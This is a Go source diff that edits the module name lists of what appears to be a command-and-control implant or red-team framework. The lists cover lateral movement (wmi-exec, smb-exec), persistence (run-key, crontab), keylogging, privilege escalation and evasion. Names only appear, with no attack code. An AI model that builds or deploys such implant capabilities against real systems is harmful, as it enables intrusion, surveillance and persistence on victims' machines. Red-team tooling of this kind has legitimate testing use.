@@ -32,6 +32,19 @@ package modules
 - driver
 * finish driver and get a certificate for it.
 
+	// removed use external dlls and custom pe load or shinject
+	//"port-forward",
+	//"revert-port-forward",
+	//"create-service",
+	//"start-service",
+	//"stop-service",
+	//"delete-service",
+	//"create-scheduled-task",
+	//"execute-scheduled-task",
+	//"delete-scheduled-task",
+	//"modify-service-binary",
+	//"go-up", // sharpup for golang -> doesnt work :(
+
 */
 var ExecutionModulesList = [...]string{
 	"exit",
@@ -67,17 +80,6 @@ var EvasionModulesList = [...]string{
 
 var LateralMovementModulesList = [...]string{
 	"exit",
-	// removed use external dlls and custom pe load or shinject
-	//"port-forward",
-	//"revert-port-forward",
-	//"create-service",
-	//"start-service",
-	//"stop-service",
-	//"delete-service",
-	//"create-scheduled-task",
-	//"execute-scheduled-task",
-	//"delete-scheduled-task",
-	//"modify-service-binary",
 	"winrm-exec",
 	"wmi-exec",
 	"smb-exec",
@@ -88,7 +90,6 @@ var LateralMovementModulesList = [...]string{
 
 var PrivilegeEscalationModulesList = [...]string{
 	"exit",
-	"go-up", // sharpup for golang -> missing checks
 	"shell-history",
 	"start-keylogger",
 	"stop-keylogger",
@@ -101,7 +102,6 @@ var PersistenceModulesList = [...]string{
 	"powershell-profile",
 	"run-key",
 	"logon-script",
-	//"scheduled-task",
 	"launch-items",
 	"login-items",
 	"crontab",
@@ -113,6 +113,7 @@ var PersistenceModulesList = [...]string{
 
 var EnumerationModulesList = [...]string{
 	"exit",
+	"dotnet-check",
 	"env",
 	"enum-modules",
 	"enum-drivers",
@@ -151,7 +152,7 @@ var ImpersonationModulesList = [...]string{
 }
 
 var BasicModulesList = [...]string{
-	"exit", "sleep", "jitter", "pwd", "cd", "rm", "cp", "mv", "ls", "cat", "touch", "ps", "whoami", "mkdir", "rmdir", "killproc", "exit-process", "exit-thread", "shell", "download", "remote-download", "upload",
+	"exit", "sleep", "jitter", "pwd", "cd", "rm", "cp", "mv", "ls", "cat", "touch", "ps", "hostname", "whoami", "mkdir", "rmdir", "killproc", "exit-process", "exit-thread", "shell", "download", "remote-download", "upload",
 	"enumeration",
 	"impersonation",
 	"persistence",
